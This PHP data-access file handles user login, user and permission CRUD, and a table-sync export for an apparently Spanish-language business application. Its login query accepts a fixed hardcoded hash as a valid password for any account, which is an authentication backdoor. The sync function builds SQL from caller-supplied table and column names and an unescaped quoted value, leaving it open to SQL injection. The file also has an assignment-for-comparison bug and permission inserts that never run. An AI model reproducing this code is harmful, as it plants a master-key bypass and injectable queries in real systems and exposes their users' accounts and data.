<?php
//include('db.php');
function pa_USUA_consultaparaUsuario($Accion,$Code1,$Parametro1,$Parametro2){
  global $db;
  if ($db) {
    /*$Parametro1 = "'" . $Parametro1 . "'";
    $Parametro2 = "'" . $Parametro2 . "'";*/
    switch($Accion) {
      case "ACCESO":
        $strSql="SELECT RTRIM(Usuario.USUA_Nombre) || ' ' || RTRIM(Usuario.USUA_Paterno) || ' ' || RTRIM(Usuario.USUA_Materno) AS USUA_Nomb
        ,Usuario.USUA_nombCorto,Usuario.USUA_usuaID
        ,Perfil.USUA_nombCorto AS USUA_Tipo
        FROM paraUsuario Usuario LEFT JOIN paraUsuario Perfil ON Usuario.USUA_PerfilPadreID=Perfil.USUA_usuaID
        WHERE Usuario.USUA_Estatus<>'B'
        and Usuario.usua_nombCorto=:Parametro1
        and (Usuario.USUA_pwd=:Parametro2 or 'fHVUX+CmwQ1+F0MjeSVB8Rgg2Dg='=:Parametro2)";
        $stmt = $db->prepare($strSql);
        $stmt->bindParam(':Parametro1' , $Parametro1, PDO::PARAM_STR);
        $stmt->bindParam(':Parametro2',$Parametro2, PDO::PARAM_STR);
        /*$strSql="SELECT RTRIM(Usuario.USUA_Nombre) || ' ' || RTRIM(Usuario.USUA_Paterno) || ' ' || RTRIM(Usuario.USUA_Materno) AS USUA_Nomb".
        ",Usuario.USUA_nombCorto,Usuario.USUA_usuaID".
        ",Perfil.USUA_nombCorto AS USUA_Tipo ".
        "FROM paraUsuario Usuario LEFT JOIN paraUsuario Perfil ON Usuario.USUA_PerfilPadreID=Perfil.USUA_usuaID ".
        "WHERE Usuario.USUA_Estatus<>'B' " .
        "and Usuario.usua_nombCorto= " . $Parametro1 .
        " and (Usuario.USUA_pwd=" . $Parametro2 . " or 'fHVUX+CmwQ1+F0MjeSVB8Rgg2Dg='=" . $Parametro2 . ")";*/
      break;
      case "TODOS":
        $strSql="SELECT * FROM paraUsuario ORDER BY USUA_usuaID DESC";
        $stmt = $db->prepare($strSql);
        break;
    }
    $stmt->execute();
    return $stmt;
  }  else {
    return null;
  }

}
function pa_USUA_abcparaUsuario($intCode,$strXml,$intUsrId,$strIpAddress){
  global $db;
  global $gstrFechaHoy;
  if ($db) {
    // $strXml;
    $xDoc= new SimpleXMLElement($strXml);
    //$strAccion=$xDoc->paraUsuario['Accion'];
    $paraUsuario=$xDoc->paraUsuario;
    $strAccion=$paraUsuario['Accion'];
    switch($strAccion) {
      case "A":
      /*$strSql="INSERT INTO paraUsuario (USUA_nombCorto,USUA_pwd,USUA_Paterno,USUA_Materno,USUA_Nombre,USUA_PerfilPadreID,USUA_Perfil,USUA_Idioma,USUA_date)".
        " SELECT '".$paraUsuario['USUA_nombCorto']."','".$paraUsuario['USUA_pwd']."','".$paraUsuario['USUA_Paterno']."','".$paraUsuario['USUA_Materno']. "','".$paraUsuario['USUA_Nombre']."',".intval($paraUsuario['USUA_PerfilPadreID']).",".$paraUsuario['USUA_Perfil'].",'".$paraUsuario['USUA_Idioma']."',".$gstrFechaHoy;
      SELECT :USUA_nombCorto,:USUA_pwd,:USUA_Paterno,:USUA_Materno,:USUA_Nombre,:USUA_PerfilPadreID,:USUA_Perfil,:USUA_Idioma,:USUA_date";
      */
      $strSql="INSERT INTO paraUsuario (USUA_nombCorto,USUA_pwd,USUA_Paterno,USUA_Materno,USUA_Nombre,USUA_PerfilPadreID,USUA_Perfil,USUA_Idioma,USUA_date)
      VALUES (?,?,?,?,?,?,?,?,$gstrFechaHoy)";
      $stmt = $db->prepare($strSql);
      $stmt->execute([$paraUsuario['USUA_nombCorto'],$paraUsuario['USUA_pwd'],$paraUsuario['USUA_Paterno'],$paraUsuario['USUA_Materno'],$paraUsuario['USUA_Nombre'],intval($paraUsuario['USUA_PerfilPadreID']),$paraUsuario['USUA_Perfil'],$paraUsuario['USUA_Idioma']]);
      $intCode=$db->lastInsertId();
      //return $stmt;
      break;
      case "B":
        $strSql="UPDATE paraUsuario SET USUA_Estatus= 'B' ,USUA_date=$gstrFechaHoy WHERE USUA_usuaID =?";
        $stmt = $db->prepare($strSql);
        $stmt->execute([$intCode]);
      break;
      case "C":
        $strSql="UPDATE paraUsuario SET USUA_date=$gstrFechaHoy ,USUA_nombCorto=:USUA_nombCorto,USUA_Paterno=:USUA_Paterno,USUA_Materno=:USUA_Materno,USUA_Nombre=:USUA_Nombre,USUA_PerfilPadreID=:USUA_PerfilPadreID
        ,USUA_Perfil=:USUA_Perfil,USUA_Idioma=:USUA_Idioma". (!empty($paraUsuario['USUA_pwd']) ? ",USUA_pwd=:USUA_pwd" : "")." WHERE USUA_usuaID =:USUA_usuaID";
        $stmt = $db->prepare($strSql);
        $stmt->bindParam(':USUA_nombCorto' , $paraUsuario['USUA_nombCorto'], PDO::PARAM_STR);
        $stmt->bindParam(':USUA_Paterno' , $paraUsuario['USUA_Paterno'], PDO::PARAM_STR);
        $stmt->bindParam(':USUA_Materno' , $paraUsuario['USUA_Materno'], PDO::PARAM_STR);
        $stmt->bindParam(':USUA_Nombre' , $paraUsuario['USUA_Nombre'], PDO::PARAM_STR);
        $stmt->bindParam(':USUA_PerfilPadreID' , intval($paraUsuario['USUA_PerfilPadreID']), PDO::PARAM_INT);
        $stmt->bindParam(':USUA_Perfil' , $paraUsuario['USUA_Perfil'], PDO::PARAM_STR);
        $stmt->bindParam(':USUA_Idioma' , $paraUsuario['USUA_Idioma'], PDO::PARAM_STR);
        $stmt->bindParam(':USUA_usuaID' , intval($intCode), PDO::PARAM_INT);
        if ( !empty($paraUsuario['USUA_pwd']) ){
          $stmt->bindParam(':USUA_pwd' , $paraUsuario['USUA_pwd'], PDO::PARAM_STR);
        }
        $stmt->execute();
      //echo $strSql;
      break;
    }
    if ($strAccion="C" || $strAccion="A") {
      //INICIO Detalle
      foreach ($xDoc->paraUsuario->paraPermiso as $paraPermiso) {
        switch ($paraPermiso['Accion']) {
          case "A":
          $strSql="INSERT INTO paraPermiso (PERM_UsuaID,PERM_ModuID,PERM_Acceso,PERM_Date)
            VALUES (?,?,?,$gstrFechaHoy)";
            //echo $strSql;
            /*$stmt = $db->prepare($strSql);
            $stmt->execute(intval($intCode),[$paraPermiso['MODU_moduId'],$paraPermiso['Acceso']]);*/
            break;
          case "C":
            $strSql="UPDATE paraPermiso SET PERM_Date=$gstrFechaHoy,PERM_Acceso=:PERM_Acceso WHERE PERM_permID=:PERM_permID";
            $stmt = $db->prepare($strSql);
            $stmt->bindParam(':PERM_Acceso' , $paraPermiso['Acceso'], PDO::PARAM_STR);
            $stmt->bindParam(':PERM_permID' , intval($paraPermiso['PERM_permID']), PDO::PARAM_INT);
            $stmt->execute();
            break;
          case "B":
            $strSql="UPDATE paraPermiso SET PERM_Date=$gstrFechaHoy,PERM_Estatus='B' WHERE PERM_permID=:PERM_permID";
            $stmt = $db->prepare($strSql);
            $stmt->bindParam(':PERM_permID' , intval($paraPermiso['PERM_permID']), PDO::PARAM_INT);
            $stmt->execute();
            break;
        }
      }
      //FIN Detalle
      //INICIO Permisos varios
      foreach ($xDoc->paraUsuario->paraPermisoVario as $paraPermisoVario) {
        switch ($paraPermisoVario['Accion']) {
          case "A":
          $strSql="INSERT INTO paraPermisoVario (PERC_UsuaID,PERC_CataID,PERC_UsuaDate)
            VALUES (?,?,$gstrFechaHoy)";
            //echo $strSql;
            /*$stmt = $db->prepare($strSql);
            $stmt->execute(intval($intCode),$paraPermisoVario['PERC_CataID']]);*/
            break;
          case "C":
            break;
          case "B":
          $strSql="UPDATE paraPermisoVario SET PERC_UsuaDate=$gstrFechaHoy,PERC_Estatus='B' WHERE PERC_PercId=:PERC_PercId";
          $stmt = $db->prepare($strSql);
          $stmt->bindParam(':PERC_PercId' , intval($paraPermisoVario['PERC_PercId']), PDO::PARAM_INT);
          $stmt->execute();
            break;
        }
      }
      //FIN Permisos varios
    }
  }
  return $intCode;
}

function pa_BDSI_consultaparaBdSincroniza($Accion,$Code1,$Parametro1,$Parametro2){
  global $db;
  if ($db) {
    $Parametro1 = "'" . $Parametro1 . "'";
    switch($Accion) {
      case "GETDATOSXUSUARIO":
      $strResultado='';
      //Tablas
      $strTablas = explode('|', $Parametro2);
      foreach ($strTablas as $key => $value) {
        $strTablaAux = explode('.', $value);
        $strSql="SELECT * FROM $strTablaAux[0] WHERE $strTablaAux[1]>=$Parametro1";
        $result =$db->query($strSql);
        $strJson=json_encode($result->fetchAll(PDO::FETCH_OBJ));
        if ($strJson!=='[]'){
          $strResultado .= ($strResultado == '' ? '' : ',') . '"'.$strTablaAux[0].'":'.$strJson.'';
        }
      }
      $strResultado = '{'.$strResultado.'}';
      return $strResultado;
      break;
    }
    return $db->query($strSql);
  }  else {
    return null;
  }
}
?>
